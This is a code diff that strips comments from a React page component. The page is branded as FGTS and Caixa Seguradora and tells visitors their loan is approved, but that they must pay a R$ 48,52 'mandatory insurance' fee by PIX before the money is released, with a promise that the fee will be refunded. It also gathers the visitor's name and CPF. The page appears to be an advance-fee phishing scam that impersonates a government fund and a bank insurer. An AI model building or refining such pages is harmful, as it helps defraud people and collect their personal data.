@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
 import { AlertTriangle, DollarSign, BarChart3, Home, HelpCircle, MoreHorizontal } from 'lucide-react';
@@ -17,15 +16,12 @@ const InsuranceRequest = () => {
   const [storedCPF, setStoredCPF] = useState<string>('');
   const [storedUserName, setStoredUserName] = useState<string>('');
   
-  // Add scroll to top effect and get stored user data
   useEffect(() => {
     window.scrollTo(0, 0);
     
-    // Get user data from localStorage
     const savedCPF = localStorage.getItem('userCPF') || '';
     setStoredCPF(savedCPF);
     
-    // Try to get user name from stored data
     try {
       const userData = localStorage.getItem('userData');
       if (userData) {
@@ -39,7 +35,6 @@ const InsuranceRequest = () => {
     }
   }, []);
   
-  // Get the selected bank data from location state
   const { 
     bankLogo, 
     bankName,
@@ -61,11 +56,9 @@ const InsuranceRequest = () => {
     userCPF: "123.456.789-00"
   };
 
-  // Get actual values, preferring localStorage values over location state
   const actualUserName = storedUserName || userName;
   const actualCPF = storedCPF || userCPF;
 
-  // Format CPF with dots and dash if it's not already formatted
   const formatCPF = (cpf: string) => {
     if (!cpf) return '';
     if (cpf.includes('.') || cpf.includes('-')) return cpf;
@@ -86,12 +79,10 @@ const InsuranceRequest = () => {
   };
 
   const handleSubmit = () => {
-    // Save the entered name if available
     if (name) {
       localStorage.setItem('userName', name);
     }
     
-    // Navigate to the PIX payment page
     navigate('/pix-payment', {
       state: {
         bankLogo,
@@ -110,13 +101,11 @@ const InsuranceRequest = () => {
 
   return (
     <div className="min-h-[100svh] flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9] overflow-hidden">
-      {/* Header */}
       <div className="p-4 sm:p-6 flex justify-between items-center">
         <FGTSLogo className={`${isMobile ? 'h-8 w-24' : 'h-10'}`} />
-        <div className="h-10"></div> {/* Placeholder for symmetry */}
+        <div className="h-10"></div>
       </div>
 
-      {/* Title */}
       <div className="p-4 sm:p-6">
         <div className="text-white text-2xl font-light">Seguro Obrigatório</div>
         <div className="text-white opacity-60 text-sm mt-1">
@@ -124,11 +113,9 @@ const InsuranceRequest = () => {
         </div>
       </div>
 
-      {/* Main content */}
       <div className="flex-1 bg-white rounded-t-3xl overflow-hidden flex flex-col">
         <div className="flex-1 p-4 sm:p-6 flex flex-col pb-32">
           <div className="flex flex-col max-w-md mx-auto w-full">
-            {/* Insurance logo */}
             <div className="flex justify-center mb-6">
               <img 
                 src="https://media2.proteste.org.br//images/DDBB8128AB9AB42685E575D2A51C4EAF700D438A/caixa-seguradora.png"
@@ -137,7 +124,6 @@ const InsuranceRequest = () => {
               />
             </div>
             
-            {/* Alert box */}
             <div className="bg-orange-50 border-l-4 border-orange-500 p-4 mb-6">
               <div className="flex items-start">
                 <div className="flex-shrink-0">
@@ -149,14 +135,12 @@ const InsuranceRequest = () => {
               </div>
             </div>
             
-            {/* Description */}
             <p className="text-gray-700 mb-6">
               O seu empréstimo foi aprovado, mas para que o saque seja efetuado para os dados bancários informados, 
               é necessário assinar o contrato com a seguradora de inadimplência. A Caixa Seguradora solicitou o 
               pagamento de um seguro no valor de R$ 48,52, que visa garantir a segurança da transação.
             </p>
             
-            {/* Highlighted text */}
             <div className="bg-green-50 p-4 border-l-4 border-green-500 mb-6">
               <p className="font-medium text-green-800">
                 Esse valor será devolvido após a finalização de todas as taxas do empréstimo, 
@@ -164,7 +148,6 @@ const InsuranceRequest = () => {
               </p>
             </div>
             
-            {/* Form */}
             <div className="space-y-4 mb-6">
               <div>
                 <Label htmlFor="fullName">Nome Completo:</Label>
@@ -187,7 +170,6 @@ const InsuranceRequest = () => {
               </div>
             </div>
             
-            {/* Operation details */}
             <div className="border rounded-lg p-4 mb-8">
               <h3 className="font-semibold text-lg mb-2">Dados da Operação:</h3>
               <div className="space-y-2 text-sm">
@@ -214,7 +196,6 @@ const InsuranceRequest = () => {
               </div>
             </div>
             
-            {/* Payment button */}
             <Button 
               onClick={handleSubmit} 
               className="w-full bg-[#005CA9] hover:bg-[#004A87] py-6 rounded-full mb-8"
@@ -224,7 +205,6 @@ const InsuranceRequest = () => {
           </div>
         </div>
         
-        {/* Footer */}
         <div className="mt-auto w-full bg-white border-t border-gray-200">
           <div className="flex justify-around items-center py-3">
             <div className="flex flex-col items-center text-gray-500">
